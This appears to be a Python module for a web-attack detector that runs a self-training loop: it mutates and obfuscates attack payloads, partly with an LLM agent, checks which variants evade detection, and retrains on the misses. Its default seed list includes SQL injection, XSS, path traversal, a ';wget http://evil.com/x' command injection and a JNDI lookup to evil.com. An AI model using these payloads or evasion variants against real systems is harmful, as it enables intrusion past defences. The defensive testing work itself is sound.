"""自我迭代闭环：生成 → 检测 → 漏检发现新手法 → 缓存/重训 → 下一轮。"""

from __future__ import annotations

import json
import random
from collections import Counter
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from iga_guard.adversarial.ast_mutator import ast_obfuscate, ast_obfuscate_batch
from iga_guard.adversarial.mutator import mutate_batch
from iga_guard.dataset.obfuscation_techniques import expand_payload
from iga_guard.evolution.self_train import incremental_retrain, log_failure
from iga_guard.evolution.miss_rule_pipeline import process_misses
from iga_guard.evolution.technique_discovery import discover_from_miss
from iga_guard.evolution.technique_registry import TechniqueRegistry
from iga_guard.obfuscation_signals import reload_discovered_rescue_rules
from iga_guard.eval_transport import build_eval_request, build_http_request


@dataclass
class RoundResult:
    round: int
    total: int
    detected: int
    missed: int
    recall: float
    block_detected: int = 0
    label_detected: int = 0
    block_recall: float = 0.0
    label_recall: float = 0.0
    new_techniques: list[str] = field(default_factory=list)
    miss_samples: list[dict] = field(default_factory=list)
    retrain: dict = field(default_factory=dict)
    cache_stats: dict = field(default_factory=dict)


def _default_seeds() -> list[tuple[str, str]]:
    return [
        ("1 union select 1,2--", "SQLi"),
        ("<script>alert(1)</script>", "XSS"),
        (";wget http://evil.com/x", "CMD"),
        ("../../../etc/passwd", "PathTraversal"),
        ("${jndi:ldap://evil.com/a}", "CMD"),
    ]


def generate_round_variants(
    pool: list[tuple[str, str]],
    registry: TechniqueRegistry,
    *,
    round_num: int,
    seed: int,
    variants_per_seed: int = 4,
    max_variants: int = 200,
    llm_agent=None,
    miss_pool: list[tuple[str, str]] | None = None,
    confidence_scores: dict[str, float] | None = None,
) -> list[tuple[str, str, str]]:
    rng = random.Random(seed + round_num * 997)
    out: list[tuple[str, str, str]] = []
    seen: set[str] = set()
    ordered_pool = list(pool)
    if confidence_scores:
        # WAF-A-MoLE 思路：优先围绕低置信度/近阈值 miss 做语义保持变异。
        ordered_pool.sort(key=lambda pl: confidence_scores.get(pl[0], 1.0))

    # LLM 自主迭代变种（优先注入）
    if llm_agent is not None and getattr(llm_agent, "available", lambda: False)():
        llm_batch = llm_agent.generate_batch(
            ordered_pool,
            n_per_seed=min(3, variants_per_seed),
            miss_pool=miss_pool,
            round_num=round_num,
            max_total=min(max_variants // 2, 40),
        )
        for v, label, src in llm_batch:
            if v not in seen:
                seen.add(v)
                out.append((v, label, src))
            if len(out) >= max_variants:
                return out

    for payload, label in ordered_pool:
        sources: list[tuple[str, str]] = [(payload, "seed")]
        for v in mutate_batch(payload, label, n=2):
            sources.append((v, "mutator"))
        for v in ast_obfuscate_batch(payload, n=2) or [ast_obfuscate(payload)]:
            sources.append((v, "ast"))
        for item in expand_payload(payload, label, n=variants_per_seed, seed=seed + hash(payload) % 999):
            sources.append((item["payload"], item.get("source", "obfuscation")))
        for name in registry.applicable_for(label):
            dv = registry.apply(payload, name, rng)
            if dv != payload:
                sources.append((dv, f"discovered:{name}"))

        rng.shuffle(sources)
        for v, src in sources:
            if v not in seen:
                seen.add(v)
                out.append((v, label, src))
            if len(out) >= max_variants:
                return out
    return out


class AutoEvolveLoop:
    """可配置轮次的自我演化编排器。"""

    def __init__(
        self,
        root: Path,
        *,
        config_path: Path | None = None,
    ) -> None:
        from iga_guard.pipeline import IgaGuardEngine, load_config

        self.root = root
        cfg_path = config_path or root / "configs" / "default.yaml"
        import os
        cfg_path = Path(os.environ.get("IGA_CONFIG", str(cfg_path)))
        self.cfg = load_config(cfg_path)
        self.engine = IgaGuardEngine(self.cfg)
        self.registry = TechniqueRegistry(root / "data" / "cache" / "discovered_techniques.json")
        self.failures_path = root / "data" / "cache" / "auto_evolve_failures.jsonl"
        self.history_path = root / "data" / "cache" / "auto_evolve_history.jsonl"
        self.round_misses_path = root / "data" / "cache" / "auto_evolve_round_misses.jsonl"
        self.llm_agent = self._init_llm_agent()

    def _init_llm_agent(self):
        llm_cfg = self.cfg.get("llm_agent", {})
        if not llm_cfg.get("enabled", False):
            return None
        from iga_guard.adversarial.llm_agent import LLMAdversarialAgent
        agent = LLMAdversarialAgent(llm_cfg)
        agent.history_path = self.root / "data" / "cache" / "llm_agent_history.jsonl"
        return agent if agent.available() else None

    def _detect(self, payload: str, label: str) -> tuple[bool, object]:
        method, url, body = build_eval_request(payload, base_url="http://auto.local/test")
        report = self.engine.analyze_url(method, url, body=body, explain=False)
        hit = report.detection.is_malicious or report.detection.label == label
        return hit, report

    def _apply_learning(self, misses: list[dict]) -> tuple[dict, dict]:
        retrain_result: dict = {}
        cache_result: dict = {}

        for m in misses:
            req = build_http_request(m["payload"], base_url="http://auto.local/test")
            report = self.engine.analyze_request(req, explain=False)
            log_failure(str(self.failures_path), report, m["label"])

        evo = self.cfg.get("evolution", {})
        detector = self.engine.detector
        if hasattr(detector, "base"):
            detector = detector.base
        # 低样本轮次也要触发学习，避免 E9 第 2/3 轮漏检持续累积。
        configured_min = int(evo.get("retrain_min_samples", 20))
        min_samples = max(1, min(configured_min, len(misses)))
        if misses and len(misses) >= min_samples:
            retrain_result = incremental_retrain(
                detector,
                str(self.failures_path),
                str(self.root / "models" / "fusion_detector.joblib"),
                min_samples=min_samples,
                base_train_csv=str(self.root / "data" / "master" / "train_obfuscated.csv"),
                max_base_samples=evo.get("max_base_samples", 80_000),
                failure_augment=evo.get("failure_augment", 2),
            )
            # 训练后热重载，确保下一轮立即使用新模型。
            if hasattr(detector, "load"):
                detector.load(str(self.root / "models" / "fusion_detector.joblib"))

        cache_cfg = self.cfg.get("continual_cache", {})
        if cache_cfg.get("enabled") and hasattr(self.engine.detector, "cache"):
            cache = self.engine.detector.cache
            if cache is not None:
                for m in misses:
                    cache.append(m["payload"], m["label"], source="auto_evolve", save=False)
                cache.save()
                cache_result = cache.stats()

        miss_rule_cfg = evo.get("miss_rule_pipeline", {})
        if miss_rule_cfg.get("enabled", True) and misses:
            mr = process_misses(
                misses,
                rules_path=miss_rule_cfg.get(
                    "rules_path",
                    str(self.root / "data" / "cache" / "discovered_rescue_rules.json"),
                ),
                benign_path=miss_rule_cfg.get(
                    "benign_path",
                    str(self.root / "data" / "cache" / "eval_normal_fps.jsonl"),
                ),
                max_fp_rate=float(miss_rule_cfg.get("max_fp_rate", 0.02)),
                min_cluster_size=int(miss_rule_cfg.get("min_cluster_size", 1)),
            )
            reload_discovered_rescue_rules()
            cache_result = {**cache_result, "miss_rule_pipeline": mr}
        return retrain_result, cache_result

    def run_round(
        self,
        pool: list[tuple[str, str]],
        *,
        round_num: int = 1,
        seed: int = 42,
        variants_per_seed: int = 4,
        max_variants: int = 200,
        learn: bool = True,
        miss_pool: list[tuple[str, str]] | None = None,
    ) -> RoundResult:
        variants = generate_round_variants(
            pool, self.registry,
            round_num=round_num, seed=seed,
            variants_per_seed=variants_per_seed,
            max_variants=max_variants,
            llm_agent=self.llm_agent,
            miss_pool=miss_pool,
            confidence_scores=getattr(self, "_confidence_scores", None),
        )
        detected = 0
        block_detected = 0
        label_detected = 0
        misses: list[dict] = []
        new_techniques: list[str] = []

        for payload, label, source in variants:
            hit, report = self._detect(payload, label)
            if report.detection.is_malicious:
                block_detected += 1
            if report.detection.label == label:
                label_detected += 1
            if hit:
                detected += 1
            else:
                misses.append({
                    "payload": payload,
                    "label": label,
                    "source": source,
                    "predicted": report.detection.label,
                    "confidence": round(report.detection.confidence, 4),
                })
                found = discover_from_miss(self.registry, payload, label)
                new_techniques.extend(found)

        retrain_result: dict = {}
        cache_result: dict = {}
        if learn and misses:
            retrain_result, cache_result = self._apply_learning(misses)

        total = len(variants)
        recall = round(detected / total, 4) if total else 0.0
        block_recall = round(block_detected / total, 4) if total else 0.0
        label_recall = round(label_detected / total, 4) if total else 0.0
        result = RoundResult(
            round=round_num,
            total=total,
            detected=detected,
            missed=len(misses),
            recall=recall,
            block_detected=block_detected,
            label_detected=label_detected,
            block_recall=block_recall,
            label_recall=label_recall,
            new_techniques=list(dict.fromkeys(new_techniques)),
            miss_samples=misses,
            retrain=retrain_result,
            cache_stats=cache_result,
        )
        self._append_round_misses(result)
        self._append_history(result, miss_dist=dict(Counter(m["label"] for m in misses)))
        return result

    def run(
        self,
        *,
        rounds: int = 3,
        seed: int = 42,
        variants_per_seed: int = 4,
        max_variants: int = 200,
        learn_each_round: bool = True,
        seed_pool: list[tuple[str, str]] | None = None,
    ) -> list[RoundResult]:
        pool = list(seed_pool or _default_seeds())
        results: list[RoundResult] = []
        failure_pool = list(pool)
        prev_miss_pool: list[tuple[str, str]] = []
        self._confidence_scores: dict[str, float] = {}

        for rnd in range(1, rounds + 1):
            current = failure_pool if rnd > 1 and failure_pool else pool
            rr = self.run_round(
                current,
                round_num=rnd,
                seed=seed,
                variants_per_seed=variants_per_seed,
                max_variants=max_variants,
                learn=learn_each_round,
                miss_pool=prev_miss_pool if rnd > 1 else None,
            )
            results.append(rr)
            if rr.miss_samples:
                miss_only = sorted(
                    [(m["payload"], m["label"]) for m in rr.miss_samples],
                    key=lambda pl: next(
                        m["confidence"] for m in rr.miss_samples if m["payload"] == pl[0]
                    ),
                )
                self._confidence_scores = {
                    m["payload"]: float(m["confidence"]) for m in rr.miss_samples
                }
                # 维持探索多样性，避免后续轮次仅围绕单一变体塌缩。
                carry = pool[: min(len(pool), max(3, len(miss_only) // 2))]
                failure_pool = miss_only + carry
                prev_miss_pool = list(failure_pool)
            else:
                failure_pool = list(pool)
                prev_miss_pool = []
                self._confidence_scores = {}

        return results

    def _append_history(self, result: RoundResult, miss_dist: dict) -> None:
        self.history_path.parent.mkdir(parents=True, exist_ok=True)
        record = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "round": result.round,
            "total": result.total,
            "detected": result.detected,
            "missed": result.missed,
            "recall": result.recall,
            "new_techniques": result.new_techniques,
            "registry_size": len(self.registry.techniques),
            "miss_distribution": miss_dist,
            "retrain": result.retrain,
            "cache": result.cache_stats,
        }
        with self.history_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")

    def _append_round_misses(self, result: RoundResult) -> None:
        self.round_misses_path.parent.mkdir(parents=True, exist_ok=True)
        with self.round_misses_path.open("a", encoding="utf-8") as f:
            for m in result.miss_samples:
                row = {
                    "ts": datetime.now(timezone.utc).isoformat(),
                    "round": result.round,
                    "payload": m.get("payload", ""),
                    "label": m.get("label", ""),
                    "predicted": m.get("predicted", ""),
                    "confidence": m.get("confidence", 0.0),
                    "source": m.get("source", ""),
                }
                f.write(json.dumps(row, ensure_ascii=False) + "\n")

    def summary(self, results: list[RoundResult]) -> dict:
        llm_status = self.llm_agent.status() if self.llm_agent else {"enabled": False}
        return {
            "rounds": len(results),
            "final_recall": results[-1].recall if results else 0,
            "total_new_techniques": sum(len(r.new_techniques) for r in results),
            "registry": self.registry.stats(),
            "llm": llm_status,
            "history": str(self.history_path),
        }
